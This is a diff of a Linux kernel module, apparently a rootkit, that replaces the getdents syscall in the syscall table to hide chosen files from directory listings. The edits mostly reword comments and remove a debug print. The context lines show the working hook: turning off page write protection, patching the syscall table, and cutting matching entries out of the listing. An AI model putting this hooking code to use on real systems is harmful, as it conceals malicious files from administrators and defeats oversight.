@@ -51,8 +51,8 @@ int hide(char *d_name)
 
    
 /*
- * Our manipulated getdents syscall. It checks whether a particular file needs to be hidden,
- * if matches then don't show otherwise works normally and calls the original getdents.
+ * Our manipulated getdents syscall. It checks whether a particular file needs to be hidden.
+ * If it matches then don't show, otherwise works normally and calls the original getdents.
  */
 asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
@@ -71,18 +71,14 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 		len  = dirp->d_reclen;
 		tlen = tlen-len;
 		
-		/* Check if we need to hide the process,
-		 * convert_atoi return the pid of every process in integer format,
-		 * hide will compare the pid against the user entered processes.
-		 */		
+		/* Check if we need to hide this file */
 		if(hide(dirp->d_name))
 		{	
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
 		}
-		
 		else if(tlen != 0)
-		{	//printk("sub::d_reclen:%d,tlen:%d,dname:%s,\n",dirp->d_reclen,tlen,dirp->d_name);
+		{
 			dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
 		}
 
@@ -151,19 +147,21 @@ int init_module (void)
 
 /*
  * Function called when unloading the kernel module.
- * Prints a goodbye-message and restores the original read() syscall.
+ * Prints a goodbye-message and restores the original getdent() syscall.
  */
 void cleanup_module (void)
 {
-	
+	/* disable write protection */
 	disable_page_protection();
 	
+	/* restore the old syscall */
 	sys_call_table[__NR_getdents] = (int *) original_getdents;
 
+	/* reenable write protection */
 	enable_page_protection();
 
+	/* make sure that all processes have left our manipulated syscall */
 	while(call_counter > 0) {
-		/* sleep for some time */
 		msleep(10);
 	}
 	
